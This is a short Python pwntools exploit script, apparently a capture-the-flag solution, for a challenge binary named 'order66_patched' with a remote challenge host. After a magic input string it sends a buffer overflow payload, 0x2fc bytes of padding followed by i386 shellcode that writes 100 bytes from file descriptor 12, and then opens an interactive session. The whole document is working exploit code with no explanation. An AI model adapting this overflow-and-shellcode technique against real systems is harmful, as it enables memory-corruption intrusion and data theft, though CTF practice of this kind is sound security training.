#!/usr/bin/env python3

from pwn import *

exe = ELF("./order66_patched")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("chall.polygl0ts.ch", 9000)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=True, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    magic = b"aaaaaaaaaaaOOOOOOWVRWWUUUaKKK "
    input()
    io.sendline(magic)
    import time
    time.sleep(2)
    payload = 0x2fc * b"A" + asm(shellcraft.i386.write(12, 'ecx', 100))
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
